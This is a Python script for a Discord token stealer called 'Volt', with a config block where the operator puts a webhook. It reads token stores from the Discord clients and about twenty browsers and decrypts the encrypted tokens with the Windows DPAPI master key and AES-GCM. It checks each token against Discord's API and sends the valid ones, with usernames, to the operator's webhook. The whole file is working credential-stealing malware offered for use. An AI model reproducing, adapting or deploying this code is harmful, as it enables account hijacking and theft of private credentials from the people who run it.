import httpx
import os
import json 
import base64
from re import findall
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

config = {
  "webhook": "https://discord.com/api/webhooks/Your/Webhook!", # Put your Discord Webhook Here!
  "color": 0xFFFF00, # Set this to the hex code of the color you'd like the embed to be (Keep the 0x at the beginning)
  "stealerName": "Volt", # This can be anything really. (Preference)
  "ping": True # Ping @everyone when a token is found?
}

class Volt:
    def __init__(self):
        self.appdata = os.getenv("appdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}"
        self.tokens = []
        self.findTokens()
        self.SendInfo()

    def header_gen(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_value(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Failed to decrypt token!"

    def find_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def findTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb',
            'Chromium': self.appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb',
            'Mozilla Firefox': self.roaming + r'\\Mozilla\\Firefox\\Profiles'
    }

        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                if "Mozilla" in path:
                    for loc, _, files in os.walk(path):
                        for _file in files:
                            if not _file.endswith('.sqlite'):
                                continue
                            for line in [x.strip() for x in open(f'{loc}\\{_file}', errors='ignore').readlines() if x.strip()]:
                                for token in findall(self.regex, line):
                                    r = httpx.get("https://discord.com/api/v9/users/@me", headers=self.header_gen(token))
                                    if r.status_code == 200:
                                        if token in self.tokens:
                                            continue
                                        self.tokens.append(token)

                else:
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in findall(self.regex, line):
                                r = httpx.get("https://discord.com/api/v9/users/@me", headers=self.header_gen(token))
                                if r.status_code == 200:
                                    if token in self.tokens:
                                        continue
                                    self.tokens.append(token)
        

            else:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in findall(self.encrypted_regex, line):
                            for i in ["discordcanary", "discord", "discordptb"]:
                                if os.path.exists(self.roaming + f'\\{i}\\Local State'):
                                    token = self.decrypt_value(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.find_key(self.roaming + f'\\{i}\\Local State'))
                                    r = httpx.get("https://discord.com/api/v9/users/@me", headers=self.header_gen(token))
                                    if r.status_code == 200:
                                        if token in self.tokens:
                                            continue
                                        self.tokens.append(token)
    
    def SendInfo(self):
        formatted = []
        for x in self.tokens:
            j = httpx.get("https://discord.com/api/v9/users/@me", headers=self.header_gen(x)).json()
            name = j['username']+'#'+j['discriminator']
            formatted.append(f'Name: `{name}` | Token: ||{x}||')
        
        httpx.post(config['webhook'], json={"content":"@everyone" if config['ping'] else '',"embeds":[{"title": config['stealerName'],"color": config['color'],"description":"**Info Found!**\n**Tokens:**\n"+'\n'.join(formatted)}]})

if __name__ == '__main__':
    Volt()
